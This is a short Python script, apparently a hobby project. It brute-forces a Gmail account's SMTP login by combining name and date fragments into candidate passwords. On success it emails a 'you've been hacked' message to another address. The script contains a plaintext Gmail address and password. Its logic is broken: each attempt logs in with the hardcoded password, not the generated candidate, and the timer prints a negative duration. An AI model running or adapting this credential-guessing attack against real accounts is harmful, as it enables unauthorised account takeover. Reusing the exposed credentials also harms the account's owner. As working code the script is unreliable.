import smtplib
import sys
import time

start_time = time.time()


def generate(arr, i, s, len):
    if (i == 0):
        try:
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            server.login("ahhumofficial@gmail.com", "ahhumofficial26121998")
            server.sendmail(
                "ahhumofficial@gmail.com",
                "samuel.mouango@gmail.com",
                "Tu t'es fais hacker")
            server.quit()
            print(f"[+]{s}: Password Cracker[+]")
            end_time = start_time - time.time()
            print(f"Time for crack this password: {str(int(end_time))}s")
            sys.exit()
        except Exception as e:
            print(f"[+]{s} n'est pas le mot de passe[+]")
        return

    for j in range(0, len):
        appended = s + arr[j]
        generate(arr, i - 1, appended, len)
    return


def crack(arr, len):
    for i in range(6, 7):
        generate(arr, i, '', len)


arr = [
    "ah",
    "hum",
    "official",
    "26",
    "12",
    "1998",
]

len = len(arr)
crack(arr, len)
